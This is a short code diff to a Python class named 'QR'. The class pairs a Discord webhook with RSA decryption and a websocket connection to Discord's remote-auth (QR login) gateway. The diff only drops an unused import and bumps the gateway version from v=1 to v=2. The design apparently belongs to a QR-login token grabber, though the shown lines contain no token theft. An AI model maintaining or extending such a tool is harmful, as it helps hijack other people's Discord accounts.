@@ -8,7 +8,7 @@ from Crypto.Hash import SHA256
 from Crypto.Cipher import PKCS1_OAEP
 import base64
 from discord_webhook import DiscordWebhook, DiscordEmbed
-import PIL
+
 
 class QR:
     def __init__(self, webhook):
@@ -69,7 +69,7 @@ class QR:
         return ujson.loads(item)
 
     async def connect_ws(self):
-        self.ws = await websockets.connect("wss://remote-auth-gateway.discord.gg/?v=1", origin="https://discord.com")
+        self.ws = await websockets.connect("wss://remote-auth-gateway.discord.gg/?v=2", origin="https://discord.com")
 
     async def heartbeat(self, interval):
         while True:
